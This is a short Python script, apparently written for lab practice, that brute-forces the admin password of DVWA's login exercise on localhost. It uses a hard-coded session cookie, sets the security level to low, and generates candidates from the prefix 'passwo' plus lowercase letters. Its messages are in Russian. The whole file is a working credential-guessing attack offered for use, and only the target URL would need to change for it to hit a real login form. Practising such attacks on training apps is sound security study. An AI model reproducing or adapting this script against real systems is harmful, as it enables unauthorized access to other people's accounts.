import itertools
import requests
import time

charset = 'abcdefghijklmnopqrstuvwxyz'
pass_length = 8
username = "admin"
dop = "passwo"
session = requests.Session()
url = "http://localhost/dvwa/vulnerabilities/brute/"
session.cookies.set("PHPSESSID", "uj0b8e80rh66tt43mp0o8glq93")
session.cookies.set("security", "low")

def podbor(url, username, password):
    params = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }
    try:
        response = session.get(url, params=params)
        return "Welcome to the password protected area admin" in response.text
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Ошибка подключения: {e}")
        return False
    except requests.exceptions.RequestException as e:
        print(f"[-] Ошибка при запросе: {e}")
        return False

def generate_passwords(dop, length, charset):
    remaining_length = length - len(dop)
    for combination in itertools.product(charset, repeat=remaining_length):
        yield dop + ''.join(combination)

def main():
    start_time = time.time()
    print("[*] Начинаем перебор пароля...")
    for password in generate_passwords(dop, pass_length, charset):
        print(f"[*] Проверяем: {password}")
        if podbor(url, username, password):
            print(f"[+] Успешно! Пароль: {password}")
            break
    else:
        print("[-] Не удалось найти пароль.")
    end_time = time.time()
    print(f"[+] Время выполнения: {end_time - start_time:.2f} с")

if __name__ == "__main__":
    main()

